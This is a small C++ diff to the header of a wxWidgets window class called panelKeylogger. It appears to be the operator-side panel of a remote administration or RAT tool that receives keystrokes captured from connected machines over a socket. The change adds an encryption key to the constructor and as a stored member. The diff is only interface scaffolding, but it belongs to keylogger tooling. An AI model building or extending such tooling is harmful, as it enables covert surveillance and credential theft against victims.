@@ -5,11 +5,13 @@
 
 class panelKeylogger : public wxFrame {
 	public:
-		panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID);
+		panelKeylogger(wxWindow* pParent, SOCKET sck, std::string _strID, ByteArray c_key);
 		
 		void AgregarData(const char*& pBuffer);
 
 	private:
+
+		ByteArray enc_key;
 		wxToggleButton* btn_Iniciar = nullptr;
 		wxTextCtrl* txt_Data = nullptr;
 		SOCKET sckCliente = INVALID_SOCKET;
